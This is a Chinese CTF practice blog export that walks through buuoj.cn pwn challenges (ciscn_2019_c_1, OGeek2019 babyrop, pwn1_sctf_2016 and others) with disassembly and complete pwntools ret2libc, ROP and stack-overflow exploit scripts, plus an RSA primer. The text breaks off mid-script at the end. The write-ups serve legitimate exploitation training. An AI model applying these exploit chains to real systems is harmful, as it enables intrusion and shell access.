<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Pwn练习-Day03</title>
      <link href="/2020/03/16/ctf/pwn/day03/"/>
      <url>/2020/03/16/ctf/pwn/day03/</url>
      
        <content type="html"><![CDATA[<h1 id="Day03"><a href="#Day03" class="headerlink" title="Day03"></a>Day03</h1><h2 id="0x10-前言"><a href="#0x10-前言" class="headerlink" title="0x10 前言"></a>0x10 前言</h2><p>越来越难啦，，，一天真就写了两道题</p><p>PS:这两道题还算有点意思，就放博客上了，前面的没什么意思</p><p>今天就不加入门的RSA玩了</p><h2 id="0x20-ciscn-2019-c-1"><a href="#0x20-ciscn-2019-c-1" class="headerlink" title="0x20 ciscn_2019_c_1"></a>0x20 ciscn_2019_c_1</h2><p>题目来源：buuoj.cn </p><p>考点：ret2libc，计算偏移量，18.04在调用system前需要栈对齐</p><p>难度：简单</p><p>file:</p><pre class=" language-lang-txt"><code class="language-lang-txt">ciscn_2019_c_1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=06ddf49af2b8c7ed708d3cfd8aec8757bca82544, not stripped</code></pre><p>64位动态链接库文件</p><p>checksec</p><pre class=" language-lang-txt"><code class="language-lang-txt">    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>开启了NX，栈数据不可执行</p><p>ida 反汇编主要函数</p><pre class=" language-lang-c"><code class="language-lang-c">int __cdecl main(int argc, const char **argv, const char **envp){  int v4; // [rsp+Ch] [rbp-4h]  init(*(_QWORD *)&amp;argc, argv, envp);  puts("EEEEEEE                            hh      iii                ");  puts("EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  ");  puts("EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e ");  puts("EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  ");  puts("EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee ");  puts("====================================================================");  puts("Welcome to this Encryption machine\n");  begin("Welcome to this Encryption machine\n");  while ( 1 )  {    while ( 1 )    {      fflush(0LL);      v4 = 0;      __isoc99_scanf("%d", &amp;v4);      getchar();      if ( v4 != 2 )        break;      puts("I think you can do it by yourself");      begin("I think you can do it by yourself");    }    if ( v4 == 3 )    {      puts("Bye!");      return 0;    }    if ( v4 != 1 )      break;    encrypt("%d", &amp;v4);    begin("%d");  }  puts("Something Wrong!");  return 0;}</code></pre><pre class=" language-lang-c"><code class="language-lang-c">int begin(){  puts("====================================================================");  puts("1.Encrypt");  puts("2.Decrypt");  puts("3.Exit");  return puts("Input your choice!");}</code></pre><pre class=" language-lang-c"><code class="language-lang-c">int encrypt(){  size_t v0; // rbx  char s[48]; // [rsp+0h] [rbp-50h]  __int16 v3; // [rsp+30h] [rbp-20h]  memset(s, 0, sizeof(s));  v3 = 0;  puts("Input your Plaintext to be encrypted");  gets(s);  while ( 1 )  {    v0 = (unsigned int)x;    if ( v0 &gt;= strlen(s) )      break;    if ( s[x] &lt;= 96 || s[x] &gt; 122 )    {      if ( s[x] &lt;= 64 || s[x] &gt; 90 )      {        if ( s[x] &gt; 47 &amp;&amp; s[x] &lt;= 57 )          s[x] ^= 0xFu;      }      else      {        s[x] ^= 0xEu;      }    }    else    {      s[x] ^= 0xDu;    }    ++x;  }  puts("Ciphertext");  return puts(s);}</code></pre><p>简单测试过程序之后我们会发现，程序提供了两个功能：</p><ol><li>Encrypt()函数</li><li>Decrypt()没鸟用函数</li></ol><p>而我们发现在encrypt()函数中出现了我们最喜欢的gets()函数，那么漏洞点就来了，我们可以通过手算（0x50）+(0x8)​计算出来偏移量为88，也可以用peda来算，问题都不大</p><p>算出来偏移后我们就可以干我们想干的事情了，由于程序里没有给出system函数，因此我们就需要自己来泄露libc来获取shell了</p><p>如何获取libc版本呢，这可真令人头大，我们在仔细看一下</p><p>程序是64位的程序，参数不放在栈上，而是放在寄存器中，因此我们还要使用ROPgadget来找一个pop_rdi</p><pre class=" language-lang-txt"><code class="language-lang-txt">Gadgets information============================================================0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400c80 : pop r14 ; pop r15 ; ret0x0000000000400c82 : pop r15 ; ret0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004007f0 : pop rbp ; ret0x0000000000400aec : pop rbx ; pop rbp ; ret0x0000000000400c83 : pop rdi ; ret  &lt;-------pop_rdi找到了0x0000000000400c81 : pop rsi ; pop r15 ; ret0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006b9 : ret0x00000000004008ca : ret 0x20170x0000000000400962 : ret 0x458b0x00000000004009c5 : ret 0xbf02</code></pre><p>根据我在 <a href="http://cdusec.happyhacking.top/?post=127" target="_blank" rel="noopener">http://cdusec.happyhacking.top/?post=127</a> 介绍的知识，（不同的是这个程序是64位的，因此payload要变一下）</p><pre class=" language-lang-txt"><code class="language-lang-txt">payload1='a'*offset + pop_rdi_addr + elf.plt['puts'] + elf.got['puts']+ retaddr</code></pre><p>泄露puts函数真实地址来确定libc版本</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *from LibcSearcher import *def choose(index):    sh.recvuntil("Input your choice!\n")    sh.sendline(str(index))def link_libc(payload):    sh.recvuntil("Input your Plaintext to be encrypted\n")       sh.sendline(payload)def pwn(ip,port,debug):    global sh    if debug==1:        sh = process('./ciscn_2019_c_1')        elf = ELF('./ciscn_2019_c_1')        context.log_level = 'debug'    else:        sh=remote(ip,port)    rdi_addr = 0x0000000000400c83    ret_addr=0x4009A0    puts_plt = elf.plt['puts']    puts_got = elf.got['puts']    sh.sendlineafter('choice!\n', '1')    payload1 = 'a' * 88 + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(ret_addr)    link_libc(payload1)    sh.recvuntil('@')    sh.recvline()    puts_leak = u64(sh.recvline()[:-1].ljust(8,'\x00'))    log.success('puts_leak_addr =&gt; {}'.format(hex(puts_leak)))if __name__ == '__main__':    pwn(0,0,1)</code></pre><p>执行完以后：</p><pre class=" language-lang-txt"><code class="language-lang-txt">[+] puts_leak_addr =&gt; 0x7f558db9e690</code></pre><p>我们就已经泄露出puts的真实地址了</p><blockquote><p>知识点：</p><ol><li><p>Linux的程序中使用了延迟绑定机制，也就是说一个函数在没有执行前，你是不知道它的真实地址是什么的</p></li><li><p>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</p></li><li><p>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变</p></li></ol></blockquote><p>然后就是正常的ret2libc操作了：关于libcseacher的使用方法就不过多介绍了</p><p>完整exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *from LibcSearcher import *def choose(index):    sh.recvuntil("Input your choice!\n")    sh.sendline(str(index))def link_libc(payload):    sh.recvuntil("Input your Plaintext to be encrypted\n")       sh.sendline(payload)def pwn(ip,port,debug):    global sh    if debug==1:        sh = process('./ciscn_2019_c_1')        elf = ELF('./ciscn_2019_c_1')        context.log_level = 'debug'    else:        sh=remote(ip,port)    rdi_addr = 0x0000000000400c83    ret_addr=0x4009A0 #跳转到encrypt()    puts_plt = elf.plt['puts']    puts_got = elf.got['puts']    choose(1)    payload1 = 'a' * 88 + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(ret_addr)    link_libc(payload1)    #读到\n后在读取一行就是我们想要的东西    sh.recvuntil('\n')    sh.recvline()    puts_leak = u64(sh.recvline()[:-1].ljust(8,'\x00'))    log.success('puts_leak_addr =&gt; {}'.format(hex(puts_leak)))    libc = LibcSearcher('puts', puts_leak)    libc_base = puts_leak - libc.dump('puts')    sys_addr = libc_base + libc.dump('system')    bin_sh_addr = libc_base + libc.dump('str_bin_sh')    payload2 = 'a' * 88 + p64(rdi_addr) + p64(bin_sh_addr) + p64(sys_addr)    sh.sendline(payload2)    sh.interactive()if __name__ == '__main__':    pwn(0,0,1)</code></pre><p>这个脚本在Ubuntu16.04中可以取得shell,但在18.04中，由于Ubuntu18运行机制与前面版本的不同，在调用system的时候需要进行栈对齐</p><p>因此Ubuntu18.04的payload为：</p><pre class=" language-lang-txt"><code class="language-lang-txt">ret = 0x4006b9payload_Ubuntu18 = '1'*0x58+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</code></pre><h2 id="0x30-OGeek2019-babyrop"><a href="#0x30-OGeek2019-babyrop" class="headerlink" title="0x30 [OGeek2019]babyrop"></a>0x30 [OGeek2019]babyrop</h2><p>题目来源：buuoj.cn</p><p>考点：绕过strncmp，rop,ret2libc,变量覆盖</p><p>难度：中等</p><p>file:</p><pre class=" language-lang-txt"><code class="language-lang-txt">pwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=6503b3ef34c8d55c8d3e861fb4de2110d0f9f8e2, stripped</code></pre><p>32位动态链接库文件</p><p>checksec</p><pre class=" language-lang-txt"><code class="language-lang-txt">    Arch:     i386-32-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>程序开启了NX，RELRO，意味着不能修改GOT表了</p><p>ida 反汇编主要函数</p><pre class=" language-lang-c"><code class="language-lang-c">int __cdecl main(){  int buf; // [esp+4h] [ebp-14h]  char v2; // [esp+Bh] [ebp-Dh]  int fd; // [esp+Ch] [ebp-Ch]  sub_80486BB();  fd = open("/dev/urandom", 0);#生成随机数  if ( fd &gt; 0 )    read(fd, &amp;buf, 4u);  v2 = sub_804871F(buf);#比较随机数  sub_80487D0(v2);  return 0;}</code></pre><pre class=" language-lang-c"><code class="language-lang-c">ssize_t __cdecl sub_80487D0(char a1){  ssize_t result; // eax  char buf; // [esp+11h] [ebp-E7h]  if ( a1 == 127 )    result = read(0, &amp;buf, 0xC8u);  else    result = read(0, &amp;buf, a1);  return result;}</code></pre><pre class=" language-lang-c"><code class="language-lang-c">int __cdecl sub_804871F(int a1){  size_t v1; // eax  char s; // [esp+Ch] [ebp-4Ch]  char buf[7]; // [esp+2Ch] [ebp-2Ch]  unsigned __int8 v5; // [esp+33h] [ebp-25h]  ssize_t v6; // [esp+4Ch] [ebp-Ch]  memset(&amp;s, 0, 0x20u);  memset(buf, 0, 0x20u);  sprintf(&amp;s, "%ld", a1);#生成的随机数读取到s中  v6 = read(0, buf, 0x20u);#用户输入  buf[v6 - 1] = 0;  v1 = strlen(buf);  if ( strncmp(buf, &amp;s, v1) )    exit(0);  write(1, "Correct\n", 8u);  return v5;}</code></pre><p>程序主要有三个函数，分析一下程序流程：</p><p>读取一个随机数，然后与用户输入作比较，需要绕过。<strong>strlen</strong>遇到\x00会停止，因此只要开头为\x00，最终比较的长度v1就是0，从而绕过strncmp</p><p>这里read的第三个读取长度参数实际上是前一个函数的返回值(v5)，可以通过上一次输入覆盖为\xff，然后就可以利用栈溢出进行常规ROP了。</p><p>我们来验证一下</p><pre class=" language-lang-python"><code class="language-lang-python">#usr/bin/env python#-*-coding:utf-8-*-from pwn import *libc=ELF("./libc-2.23.so")elf=ELF("./pwn")def pwn(ip,port,debug):    if debug==1:        io=process("./pwn")        context.log_level="debug"    else:        io=remote(ip,port)    payload='\x00'+'\xff'    io.sendline(payload)    io.interactive()if __name__ == '__main__':    pwn(0,0,1)</code></pre><p>运行输出Correct</p><p>绕过了随机数后我们还需要将v5覆盖的大一点来方便我们溢出，而v5距离buf(即我们的输入)的距离为：（0x2c-0x25）=7,因此根据我们以前做题的经验构造payload覆盖v5为 <code>\xff</code> </p><p>因此我们的payload1：</p><pre class=" language-lang-txt"><code class="language-lang-txt">payload1='\x00'+'a'*6+'\xff'</code></pre><p>覆盖成功，接下来就是正常的一个read()溢出漏洞了,由于程序只给了write函数，我们就只能使用write函数来泄露了</p><p>最终exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#usr/bin/env python#-*-coding:utf-8-*-from pwn import *libc=ELF("./libc-2.23.so")elf=ELF("./pwn")system_libc=libc.symbols['system']binsh_libc=libc.search('/bin/sh').next()write_libc=libc.symbols['write']write_plt=elf.plt['write']write_got=elf.got['write']main_addr=0x08048825def pwn(ip,port,debug):    if debug==1:        #io=process("./pwn")        io = process('./pwn',env={"LD_PRELOAD":"./libc-2.23.so"})        context.log_level="debug"    else:        io=remote(ip,port)    #0x2c-0x25=7    payload1='\x00'+'a'*6+'\xff'    io.sendline(payload1)    io.recvuntil('Correct\n')    #get read.got addr    #32位程序offset一般为ebp+4=0xe7+0x4    #payload='a'*offset+ write.plt+ retaddr +p32(0)+ write.got +p32(0)    #泄露write的got地址    payload='a'*0xe7+'b'*0x4    payload+=p32(write_plt)+p32(main_addr)    #    write.plt +  retaddr    payload+=p32(1)+p32(write_got)+p32(0x8)    #      write(1,wirte_got,8u)    io.sendline(payload)    write_addr=u32(io.recv()[0:4])    log.success('write_leak_addr =&gt; {}'.format(hex(write_addr)))    libc_base=write_addr-write_libc    system_addr=libc_base+ system_libc    binsh_addr=binsh_libc+libc_base    log.success('libc_leak_addr =&gt; {}'.format(hex(libc_base)))    log.success('system_leak_addr =&gt; {}'.format(hex(system_addr)))    log.success('binsh_leak_addr =&gt; {}'.format(hex(binsh_addr)))    io.sendline(payload1)    io.recvuntil('Correct\n')    payload='a'*(0xe7+0x4) + p32(system_addr)+ 'bbbb' + p32(binsh_addr)    io.sendline(payload)    io.interactive()if __name__ == '__main__':    pwn("node3.buuoj.cn",27873,1)</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn练习-Day02</title>
      <link href="/2020/03/15/ctf/pwn/day02/"/>
      <url>/2020/03/15/ctf/pwn/day02/</url>
      
        <content type="html"><![CDATA[<h1 id="Day02"><a href="#Day02" class="headerlink" title="Day02"></a>Day02</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>今天的这两道题同样很水，因此我决定加道入门的RSA玩玩，主要是堆学不动了，歇一歇 :smile_cat:</p><h2 id="0x10-pwn1-sctf-2016"><a href="#0x10-pwn1-sctf-2016" class="headerlink" title="0x10 pwn1_sctf_2016"></a>0x10 pwn1_sctf_2016</h2><p>题目来源 buuoj.cn</p><p>题目考点：经典栈溢出算偏移</p><p>题目难度：入门</p><p>file</p><pre class=" language-lang-txt"><code class="language-lang-txt">pwn1_sctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=4b1df4d30f1d6b75666c64bed078473a4ad8e799, not stripped</code></pre><p>32位，动态链接库文件</p><p>checksec</p><pre class=" language-lang-txt"><code class="language-lang-txt">    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>程序没有开启栈保护，开启了NX（栈数据不可执行）</p><p>ida 反汇编主要函数</p><pre class=" language-lang-txt"><code class="language-lang-txt">int vuln(){  int v0; // ST08_4@1  const char *v1; // eax@1  char s; // [sp+1Ch] [bp-3Ch]@1  char v4; // [sp+3Ch] [bp-1Ch]@1  char v5; // [sp+40h] [bp-18h]@1  char v6; // [sp+47h] [bp-11h]@1  char v7; // [sp+48h] [bp-10h]@1  char v8; // [sp+4Fh] [bp-9h]@1  printf("Tell me something about yourself: ");  fgets(&amp;s, 32, edata);  std::string::operator=(&amp;input, &amp;s);  std::allocator<char>::allocator(&amp;v6);  std::string::string(&amp;v5, "you", &amp;v6);  std::allocator<char>::allocator(&amp;v8);  std::string::string(&amp;v7, "I", &amp;v8);  replace(&amp;v4, &amp;input, &amp;v7);  std::string::operator=(&amp;input, &amp;v4, v0, &amp;v5);  std::string::~string(&amp;v4);  std::string::~string(&amp;v7);  std::allocator<char>::~allocator(&amp;v8);  std::string::~string(&amp;v5);  std::allocator<char>::~allocator(&amp;v6);  v1 = std::string::c_str(&amp;input);  strcpy(&amp;s, v1);  return printf("So, %s\n", &amp;s);}</char></char></char></char></code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">std::string *__stdcall replace(std::string *a1, std::string *a2, std::string *a3){  int v4; // [sp+Ch] [bp-4Ch]@0  char v5; // [sp+10h] [bp-48h]@2  char v6; // [sp+14h] [bp-44h]@2  char v7; // [sp+1Bh] [bp-3Dh]@2  int v8; // [sp+1Ch] [bp-3Ch]@2  char v9; // [sp+20h] [bp-38h]@2  int v10; // [sp+24h] [bp-34h]@2  int v11; // [sp+28h] [bp-30h]@2  char v12; // [sp+2Fh] [bp-29h]@2  int v13; // [sp+30h] [bp-28h]@2  int v14; // [sp+34h] [bp-24h]@2  char v15; // [sp+38h] [bp-20h]@2  int v16; // [sp+3Ch] [bp-1Ch]@2  char v17; // [sp+40h] [bp-18h]@2  int v18; // [sp+44h] [bp-14h]@2  char v19; // [sp+48h] [bp-10h]@2  char v20; // [sp+4Ch] [bp-Ch]@2  while ( std::string::find(a2, a3, 0) != -1 )  {    std::allocator<char>::allocator(&amp;v7);    v8 = std::string::find(a2, a3, 0);    std::string::begin(&amp;v9);    __gnu_cxx::__normal_iterator<char *,std::string="">::operator+(&amp;v10);    std::string::begin(&amp;v11);    std::string::string&lt;__gnu_cxx::__normal_iterator<char *,std::string="">&gt;(&amp;v6, v11, v10, &amp;v7);    std::allocator<char>::~allocator(&amp;v7);    std::allocator<char>::allocator(&amp;v12);    std::string::end(&amp;v13);    v14 = std::string::length(a3);    v16 = std::string::find(a2, a3, 0);    std::string::begin(&amp;v17);    __gnu_cxx::__normal_iterator<char *,std::string="">::operator+(&amp;v15);    __gnu_cxx::__normal_iterator<char *,std::string="">::operator+(&amp;v18);    std::string::string&lt;__gnu_cxx::__normal_iterator<char *,std::string="">&gt;(&amp;v5, v18, v13, &amp;v12);    std::allocator<char>::~allocator(&amp;v12);    std::operator+<char,std::char_traits<char>,std::allocator<char>&gt;(&amp;v20);    std::operator+<char,std::char_traits<char>,std::allocator<char>&gt;(&amp;v19);    std::string::operator=(a2, &amp;v19, &amp;v5, v4);    std::string::~string(&amp;v19);    std::string::~string(&amp;v20);    std::string::~string(&amp;v5);    std::string::~string(&amp;v6);  }  std::string::string(a1, a2);  return a1;}</char></char,std::char_traits<char></char></char,std::char_traits<char></char></char></char></char></char></char></char></char></char></code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">int get_flag(){  return system("cat flag.txt");}</code></pre><p>题目分析：</p><ol><li>应该是C++程序，不过关系不大</li><li>程序提供了replace() 函数</li><li>程序提供后门 get_flag</li><li>在vuln()函数中调用了replace()功能，主要是把字符 <code>I</code> 替换成 <code>you</code> , 且程序最后会将替换后的字符串重新写入 <code>s</code> 这就造成了栈溢出</li></ol><p>利用思路：</p><p>通过ida我们可以知道：<code>s</code> 距离<code>ebp</code>的距离为 <code>0x3c</code> ,程序为32位程序，因此需要的垃圾字符数量为 <code>0x3c+0x4</code></p><p>而我们最多输入32个字符，但程序会把所有的 <code>I</code> 替换成 <code>you</code> ,也就是说 输入一个 <code>I</code> 相当于3个字符，因此</p><pre class=" language-lang-txt"><code class="language-lang-txt">offset='I'*21 + 'f'# 21*3+1=0x3c+0x4=68</code></pre><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#usr/bin/env python#-*-coding:utf-8-*-from pwn import *#io=process("./pwn1_sctf_2016")io=remote("node3.buuoj.cn",27767)sys_addr=0x08048F0Dpayload=flat(["I" * 21,"1",p32(sys_addr)])io.sendline(payload)io.interactive()</code></pre><h2 id="0x20-ciscn-2019-n-1"><a href="#0x20-ciscn-2019-n-1" class="headerlink" title="0x20 ciscn_2019_n_1"></a>0x20 ciscn_2019_n_1</h2><p>题目来源 buuoj.cn</p><p>题目考点：经典栈溢出覆盖局部变量</p><p>题目难度：入门</p><p>file:</p><pre class=" language-lang-txt"><code class="language-lang-txt">ciscn_2019_n_1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=8a733f5404b1e2c65e1758c7d92821eb8490f7c5, not stripped</code></pre><p>64位动态链接库文件</p><p>checksec</p><pre class=" language-lang-txt"><code class="language-lang-txt">    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>开启NX，栈数据不可执行</p><p>ida 反汇编主要函数</p><pre class=" language-lang-txt"><code class="language-lang-txt">int func(){  int result; // eax@2  char v1; // [sp+0h] [bp-30h]@1  float v2; // [sp+2Ch] [bp-4h]@1  v2 = 0.0;  puts("Let's guess the number.");  gets(&amp;v1);  if ( v2 == 11.28125 )    result = system("cat /flag");  else    result = puts("Its value should be 11.28125");  return result;}</code></pre><p>可以看出：</p><ol><li>程序提供了后门</li><li>只要让v2==11.28125就行了</li></ol><p>故exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *context.log_level='debug'io=process('./ciscn_2019_n_1')payload=flat(['a'*(0x30-0x4),p64(0x41348000)]) #0x41348000==11.28125io.recvuntil("Let's guess the number.\n")io.sendline(payload)io.interactive()</code></pre><p>考点分析：</p><ol><li>通过栈溢出覆盖局部变量，来修改程序的值来达到修改程序运行结果的目的</li></ol><h2 id="0x30-RSA"><a href="#0x30-RSA" class="headerlink" title="0x30 RSA"></a>0x30 RSA</h2><h3 id="0x00-前言-1"><a href="#0x00-前言-1" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>RSA简介部分节选自<a href="https://blog.csdn.net/huanghelouzi/article/details/82943615" target="_blank" rel="noopener">https://blog.csdn.net/huanghelouzi/article/details/82943615</a></p><h3 id="0x10-数学基础"><a href="#0x10-数学基础" class="headerlink" title="0x10 数学基础"></a>0x10 数学基础</h3><p>素数（质数）、合数、互质数</p><p><strong>素数：</strong></p><blockquote><p>一个数如果除了1与它本身之外没有其他的因数，那么这个数就被称为素数（或者质数，取自英文单词prime的首字母）</p></blockquote><p><strong>合数：</strong></p><blockquote><p>如果一个数大于1，且该数本身不是素数，那么这个数就是一个合数。</p></blockquote><p><strong>互质数：</strong></p><blockquote><p>如果两个整数$a,b$的最大公因数（greatest common divisor）为1，即$gcb(a,b)=1$，那么称a,b两数互质,。</p></blockquote><p><strong>模反元素</strong>：</p><blockquote><p>如果两个正整数$e$和$n$互质，那么一定可以找到整数$ d $，使得<code>e * (d -1)</code> 被${n}$整除，或者说<code>e * d</code> 被${n}$除的余数是1。这时，$d$就叫做$e$的“模反元素”。欧拉定理可以用来证明模反元素必然存在。两个整数$a,b$，它们除以整数$M$所得的余数相等：<code>a ≡ b  ( mod  m)</code>，比如说5除3余数为2，11除3余数也为2，于是可写成 <code>11 ≡ 5 ( mod  3)</code> </p></blockquote><h3 id="0x20-RSA简介"><a href="#0x20-RSA简介" class="headerlink" title="0x20 RSA简介"></a>0x20 RSA简介</h3><blockquote><p>选择两个大的参数，计算出模数 $N = p * q$</p><p>计算欧拉函数 $φ = (p-1) * (q-1)$，然后选择一个$e(1&lt;e&lt;φ)$，并且$e$和$φ$互质</p><p>取$e$的模反数$d$，计算方法为:$e * d ≡ 1 \quad (\quad mod \quad φ)$ </p><p>对明文$m$进行加密：$c = pow(m, e, N)$,可以得到密文$c$</p><p>对密文$c$进行解密：$m = pow(c, d, N)$,可以得到明文$m$</p></blockquote><p>整理得出：</p><blockquote><p>$p$ 和 $q$：两个大的<code>质数</code>，是另一个参数$N$的的两个因子<br>$N$：大整数，可以称之为<code>模数</code><br>$e$ 和 $d$：互为无反数的两个指数<br>$c$ 和 $m$：密文和明文<br>$(N, e)$：公钥<br>$(N, d)$：私钥<br>$pow(x, y, z)$：效果等效$pow(x, y)1 % z$， 先计算$x$的$y$次方，如果存在另一个参数$z$，需要再对结果进行取模。<br>密钥长度：$n$以二进制表示的的位数，例如密钥长度为512代表$n$用二进制表示的长度为512bit<br>RSA安全性分析<br>对于RSA加密算法，公钥$(N, e)$为公钥，可以任意公开</p></blockquote><p>保障RSA的安全性:</p><blockquote><p>1.定期更换密钥<br>2.不同的用户不可以使用相同的模数N<br>3.$p$与$q$的差值要大，最好是差几个比特<br>4.$p-1$与$q-1$都应该有大的素因子，一般建议选择的两个大素数$p、q$使得$p=2p+1$和$q=2q+1$也是素数<br>5.$e$的选择不要太小<br>6.$d$的选择也是不可以太小，最好满足$d&gt;=n/4$</p></blockquote><h3 id="0x20-example1"><a href="#0x20-example1" class="headerlink" title="0x20 example1"></a>0x20 example1</h3><p>本题选自buuoj.cn crypto中得一道RSA</p><p>考点：已知 $p,q,e$ 求：$d$</p><p>难度：入门</p><p>题目：</p><blockquote><p>在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17<br>求解出d作为flga提交</p></blockquote><p>破解RSA最直接（亦或是暴力）的方法就是分解整数N​，然后计算欧拉函数​φ(n)=(p-1) * (q-1),再通过:</p><script type="math/tex; mode=display">d  \quad * \quad e ≡ 1 \quad mod \quad φ(N)​</script><p>即可计算出 ​d​</p><p>而在本题中，我们已经知道了$p,q,e$  ,也就是说我们只需要通过$d  \quad * \quad e ≡ 1 \quad mod \quad φ(N)$ 就可以算出 d​</p><p>我们使用python来帮助我们计算</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-import gmpy2import gmpy2# gmpy2.mpz(x)# 初始化一个大整数xp = gmpy2.mpz(473398607161)q = gmpy2.mpz(4511491)e = gmpy2.mpz(17)n = (p-1)*(q-1)#d = gmpy2.invert(e,n) # 求逆元，d * e = 1 mod nd = gmpy2.invert(e,n)print(d)</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn练习-Day01</title>
      <link href="/2020/03/13/ctf/pwn/day01/"/>
      <url>/2020/03/13/ctf/pwn/day01/</url>
      
        <content type="html"><![CDATA[<h1 id="Day01"><a href="#Day01" class="headerlink" title="Day01"></a>Day01</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>题目来源于 <a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">https://buuoj.cn/challenges</a></p><p>按顺序做的，这两道题比较简单，就不做详细解析了，解法在我前几篇写的pwn基础中提到过都是ret2text的类型</p><h2 id="0x10-pwn1"><a href="#0x10-pwn1" class="headerlink" title="0x10 pwn1"></a>0x10 pwn1</h2><p>经典栈溢出</p><p>file</p><pre class=" language-lang-txt"><code class="language-lang-txt">pwn1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=1c72ddcad651c7f35bb655e0ddda5ecbf8d31999, not stripped</code></pre><p>64位文件 dynamically linked<br>动态链接库</p><p>checksec</p><pre class=" language-lang-txt"><code class="language-lang-txt">[*] '/home/f0und/buuoj/pwn/pwn1/pwn1'    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x400000)    RWX:      Has RWX segments</code></pre><p>无保护，且程序提供了system函数</p><p>ida 反汇编查看</p><pre class=" language-lang-c"><code class="language-lang-c">int __cdecl main(int argc, const char **argv, const char **envp){  char s; // [sp+1h] [bp-Fh]@1  puts("please input");  gets(&amp;s, argv);  puts(&amp;s);  puts("ok,bye!!!");  return 0;}</code></pre><p>fun()</p><pre class=" language-lang-c"><code class="language-lang-c">int fun(){  return system("/bin/sh");}</code></pre><p>peda 算出offset为23</p><p>由此payload就明显了</p><pre class=" language-lang-txt"><code class="language-lang-txt">fun_addr=0x401186payload=flat(['a'*23,p64(fun_addr)])</code></pre><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *context.log_level="debug"io=process("./pwn1")fun_addr=0x401186payload=flat(['a'*23,p64(fun_addr)])io.sendline(payload)io.interactive()</code></pre><p>而这个exp在本地跑是没有什么问题的</p><p>nc 连上去就会超时，一会思考一下</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import 